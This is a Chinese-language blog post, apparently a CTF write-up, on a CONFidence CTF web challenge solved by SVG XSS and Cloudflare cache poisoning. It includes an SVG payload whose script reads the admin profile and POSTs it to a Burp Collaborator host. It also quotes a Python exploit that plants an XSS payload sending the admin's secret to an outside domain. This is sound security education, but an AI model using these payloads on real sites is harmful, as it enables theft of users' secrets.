@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF-Web," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="看了Teaser CONFidence CTF的一道很有意思的Web题目，预期解法是svg xss，非预期解法是缓存投毒。 题目地址：http:&#x2F;&#x2F;web50.zajebistyc.tf&#x2F; (环境还没关) 直接给了一个注册页面，随便注册即可登录：  登录后有两个功能：修改个人信息和上报bug（很常见的XSS类题目）  进入个人信息功能，可以看到路径为：http:&#x2F;&#x2F;web50.zajebistyc">
+<meta name="keywords" content="CTF-Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从一道CTF题目了解SVG XSS和缓存投毒">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;22&#x2F;%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%9B%AE%E4%BA%86%E8%A7%A3SVG%20XSS%E5%92%8C%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92&#x2F;index.html">
+<meta property="og:site_name" content="Sharp_T&#39;s Blog">
+<meta property="og:description" content="看了Teaser CONFidence CTF的一道很有意思的Web题目，预期解法是svg xss，非预期解法是缓存投毒。 题目地址：http:&#x2F;&#x2F;web50.zajebistyc.tf&#x2F; (环境还没关) 直接给了一个注册页面，随便注册即可登录：  登录后有两个功能：修改个人信息和上报bug（很常见的XSS类题目）  进入个人信息功能，可以看到路径为：http:&#x2F;&#x2F;web50.zajebistyc">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;03&#x2F;23edaf5f1638c3d2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;03&#x2F;8cc100db50208685.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;03&#x2F;7313774de7db08e7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;03&#x2F;33b4c82084860e8b.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;03&#x2F;8c8df0fc6f915a6f.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;03&#x2F;407db3d0c9cea87e.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;03&#x2F;9c8489d34729b62d.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;03&#x2F;0683609450f2b640.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;03&#x2F;bafb24bf842b742e.png">
+<meta property="og:updated_time" content="2020-03-16T10:17:59.874Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;03&#x2F;23edaf5f1638c3d2.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/22/从一道CTF题目了解SVG XSS和缓存投毒/"/>
+
+
+
+
+
+  <title>从一道CTF题目了解SVG XSS和缓存投毒 | Sharp_T's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sharp_T's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/22/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%9B%AE%E4%BA%86%E8%A7%A3SVG%20XSS%E5%92%8C%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sharp_T">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sharp_T's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">从一道CTF题目了解SVG XSS和缓存投毒</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-22T21:30:18+08:00">
+                2019-09-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>看了Teaser CONFidence CTF的一道很有意思的Web题目，预期解法是svg xss，非预期解法是缓存投毒。</p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>地址：<a href="http://web50.zajebistyc.tf/" target="_blank" rel="noopener">http://web50.zajebistyc.tf/</a> (环境还没关)</p>
+<p>直接给了一个注册页面，随便注册即可登录：</p>
+<p><img src="https://i.bmp.ovh/imgs/2020/03/23edaf5f1638c3d2.png" alt=""></p>
+<p>登录后有两个功能：修改个人信息和上报bug（很常见的XSS类题目）</p>
+<p><img src="https://i.bmp.ovh/imgs/2020/03/8cc100db50208685.png" alt=""></p>
+<p>进入个人信息功能，可以看到路径为：<br><a href="http://web50.zajebistyc.tf/profile/用户名" target="_blank" rel="noopener">http://web50.zajebistyc.tf/profile/用户名</a></p>
+<p><img src="https://i.bmp.ovh/imgs/2020/03/7313774de7db08e7.png" alt=""></p>
+<p>直接构造路径查看管理员的信息：<br><a href="http://web50.zajebistyc.tf/profile/admin" target="_blank" rel="noopener">http://web50.zajebistyc.tf/profile/admin</a></p>
+<p><img src="https://i.bmp.ovh/imgs/2020/03/33b4c82084860e8b.png" alt=""></p>
+<p>对比发现少了一个关键参数：Secret</p>
+<h4 id="常规解法"><a href="#常规解法" class="headerlink" title="常规解法"></a>常规解法</h4><p>cookie是httponly的，差不多就可以理清思路了：xss打管理员Secret</p>
+<p>下一步就是找可以利用的xss点。简单测试之后在shoesize处可以xss，但是是一个self-xss。</p>
+<p>再看头像上传功能，发现上传可以上传任意后缀文件，但是content-type都是图片。这里就想到了SVG魔法（还想到了bmp）</p>
+<p><a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/85.html</a><br><a href="https://blog.csdn.net/qq_27446553/article/details/45498489" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/45498489</a></p>
+<p><code>SVG 图像是矢量图像，可以无限缩放，而且在图像质量下降方面没有任何问题。为什么会这样呢？因为 SVG 图像是使用 XML 标记构建的，浏览器通过绘制每个点和线来打印它们，而不是用预定义的像素填充某些空间。这确保 SVG 图像可以适应不同的屏幕大小和分辨率，即使是那些尚未发明的。
+由于是在 XML 中定义的，SVG 图像比 JPG 或 PNG 图像更灵活，而且我们可以使用 CSS 和 JavaScript 与它们进行交互。SVG 图像设置可以包含 CSS 和 JavaScript。
+svg是在xml中定义的，所以可以执行xml代码，在xml代码里面嵌入css和js代码执行即可。</code></p>
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;no&quot;?&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD SVG 1.1&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Graphics&#x2F;SVG&#x2F;1.1&#x2F;DTD&#x2F;svg11.dtd&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&lt;svg version&#x3D;&quot;1.1&quot; id&#x3D;&quot;Layer_1&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; xmlns:xlink&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot; x&#x3D;&quot;0px&quot; y&#x3D;&quot;0px&quot; width&#x3D;&quot;100px&quot; height&#x3D;&quot;100px&quot; viewBox&#x3D;&quot;0 0 751 751&quot; enable-background&#x3D;&quot;new 0 0 751 751&quot; xml:space&#x3D;&quot;preserve&quot;&gt;  &lt;image id&#x3D;&quot;image0&quot; width&#x3D;&quot;751&quot; height&#x3D;&quot;751&quot; x&#x3D;&quot;0&quot; y&#x3D;&quot;0&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    href&#x3D;&quot;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; &#x2F;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;svg&gt;</span></pre></td></tr></table></figure>
+
+<p>测试成功：</p>
+<p><img src="https://i.bmp.ovh/imgs/2020/03/8c8df0fc6f915a6f.png" alt=""></p>
+<p>然后只要用js爬取<a href="http://web50.zajebistyc.tf/profile/admin" target="_blank" rel="noopener">http://web50.zajebistyc.tf/profile/admin</a> 内容然后打到vps上。<br>最后在reportbug页面将图片地址提交即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; &lt;svg xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; xmlns:xlink&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot; id&#x3D;&quot;Layer_1&quot; x&#x3D;&quot;0px&quot; y&#x3D;&quot;0px&quot; width&#x3D;&quot;100px&quot; height&#x3D;&quot;100px&quot; viewBox&#x3D;&quot;-12.5 -12.5 100 100&quot; xml:space&#x3D;&quot;preserve&quot;&gt; </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  ...</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  &lt;g&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    &lt;polygon fill&#x3D;&quot;#00B0D9&quot; points&#x3D;&quot;41.5,40 38.7,39.2 38.7,47.1 41.5,47.1 &quot;&gt;&lt;&#x2F;polygon&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">      var xhr &#x3D; new XMLHttpRequest();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">      xhr.onreadystatechange &#x3D; function() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        if (xhr.readyState &#x3D;&#x3D;&#x3D; 4) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">          var xhr2 &#x3D; new XMLHttpRequest();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">          xhr2.open(&quot;POST&quot;, &quot;http:&#x2F;&#x2F;moeyxva0u9eufolvkh7wl1n8azgp3e.burpcollaborator.net&#x2F;&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">          xhr2.send(xhr.responseText);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">      &#125;   </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">      xhr.open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;web50.zajebistyc.tf&#x2F;profile&#x2F;admin&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">      xhr.withCredentials &#x3D; true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">      xhr.send();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    &lt;&#x2F;script&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">  &lt;&#x2F;g&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">  ...</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;svg&gt;</span></pre></td></tr></table></figure>
+
+<p>提交之后稍等一下，就打回来了Secret：</p>
+<p><img src="https://i.bmp.ovh/imgs/2020/03/407db3d0c9cea87e.png" alt=""></p>
+<h4 id="非预期解法"><a href="#非预期解法" class="headerlink" title="非预期解法"></a>非预期解法</h4><p>用P牛的话简单解读缓存投毒：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">原理就是正常的缓存是架设在用户和服务器中间，能够让用户更快地获取想要的结果，而缓存投毒的意思就是：攻击者使缓存服务器存储了有害的页面，此时正常用户如果命中了这个缓存，将会被有害页面攻击。</span></pre></td></tr></table></figure>
+
+<p>从响应头可以看到题目使用cloudflare来做CDN缓存：</p>
+<p><img src="https://i.bmp.ovh/imgs/2020/03/9c8489d34729b62d.png" alt=""></p>
+<p>CLOUDFLARE CDN 默认只对 静态资源进行缓存加速, 比如 JS, CSS, 图片, 音频, 文档等. 如果是动态的页面, 比如PHP HTML这些请求的话 CLOUDFLARE是默认不缓存的。但是开头我们就发现可以注册任意用户名，我们可以注册aixzz1.js这样的用户名来触发CDN缓存。</p>
+<p>这里注册两个账号做测试。aixzz1.js:</p>
+<p><img src="https://i.bmp.ovh/imgs/2020/03/0683609450f2b640.png" alt=""></p>
+<p>用另一个账户访问投毒页面：</p>
+<p><img src="https://i.bmp.ovh/imgs/2020/03/bafb24bf842b742e.png" alt=""></p>
+<p>但是这里又会发现一个奇怪的问题：响应头中有两个Vary头</p>
+<p>Vary: Accept-Encoding<br>Vary: Cookie</p>
+<p>vary头是用来决定使用哪个请求头来作为查找缓存的依据的。<br>但是题目的解法就是让admin访问了自己投毒的XSS缓存，而管理员的cookie显然是不知道的，但是却能成功投毒。我们这两个账户的cookie也明显是不一样的，但是却能成功投毒。</p>
+<p>这里看到师傅们的猜测是vary头可能没起作用。毕竟是静态缓存，js、css、图片什么的是可以被当作公共文件来访问的。</p>
+<p>最后就是投毒了，通过上面我们知道如果我们要投毒成功，必须要新注册一个用户名为.js后缀的账号，然后直接post修改数据的投毒数据包，不能先访问再更改，因此你访问之后页面已经被缓存了，当然还可以计算缓存结束时间，然后bp爆破修改数据，不过比较麻烦。</p>
+<p>另外我们投毒的机器还要和admin使用同一个CDN缓存服务器。因此我们需要购买指定地区的vps（emmm）。</p>
+<p>ctftime上的exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">import requests, random</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&#39;&#39;fetch(&quot;&#x2F;profile&quot;).then(function(e)&#123;e.text().then(function(f)&#123;new&#x2F;**&#x2F;Image().src&#x3D;&#39;&#x2F;&#x2F;avlidienbrunn.se&#x2F;?&#39;+&#x2F;secret(.*)&gt;&#x2F;.exec(f)[0]&#125;)&#125;)&#39;&#39;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">raw_data &#x3D; &#39;&#39;&#39;------WebKitFormBoundary8XvNm1gXcAtb4Hik</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;firstname&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">azz</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary8XvNm1gXcAtb4Hik</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;lastname&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">zzz</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary8XvNm1gXcAtb4Hik</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;shoesize&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">1 tabindex&#x3D;1 contenteditable autofocus onfocus&#x3D;&#39;&#39;&#39;+payload+&#39;&#39;&#39; </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary8XvNm1gXcAtb4Hik</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;secret&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">asd</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary8XvNm1gXcAtb4Hik</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;avatar&quot;; filename&#x3D;&quot;&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">Content-Type: application&#x2F;octet-stream</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary8XvNm1gXcAtb4Hik--</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">&#39;&#39;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">s &#x3D; requests.Session()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">s.get(&#39;http:&#x2F;&#x2F;web50.zajebistyc.tf&#x2F;login&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">username &#x3D; &#39;hfs-&#39;+str(random.randint(1000000,99999999))+&quot;.js&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">password &#x3D; username</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">headers_login &#x3D; &#123;&#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">headers &#x3D; &#123;&#39;Content-Type&#39;: &#39;multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary8XvNm1gXcAtb4Hik&#39;&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line"># Register account</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">res &#x3D; s.post(&#39;http:&#x2F;&#x2F;web50.zajebistyc.tf&#x2F;login&#39;, headers&#x3D;headers_login, data&#x3D;&quot;login&#x3D;&quot;+username+&quot;&amp;password&#x3D;&quot;+password)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line"># XSS profile</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">res &#x3D; s.post(&#39;http:&#x2F;&#x2F;web50.zajebistyc.tf&#x2F;profile&#x2F;&#39;+username, data&#x3D;raw_data, headers&#x3D;headers)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line"># Poison cloudflare cache</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">s.get(&#39;http:&#x2F;&#x2F;web50.zajebistyc.tf&#x2F;profile&#x2F;&#39;+username)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">print &quot;poisoned. go report &quot;+&#39;http:&#x2F;&#x2F;web50.zajebistyc.tf&#x2F;profile&#x2F;&#39;+username</span></pre></td></tr></table></figure>
+
+<p>参考链接：</p>
+<p><a href="https://xz.aliyun.com/t/4492" target="_blank" rel="noopener">https://xz.aliyun.com/t/4492</a><br><a href="https://blog.csdn.net/like98k/article/details/88702920" target="_blank" rel="noopener">https://blog.csdn.net/like98k/article/details/88702920</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF-Web/" rel="tag"># CTF-Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/01/Misc%E5%85%B6%E4%BB%96-1/" rel="next" title="Misc其他-1">
+                <i class="fa fa-chevron-left"></i> Misc其他-1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/17/Roarctf-Web/" rel="prev" title="Roarctf-Web">
+                Roarctf-Web <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
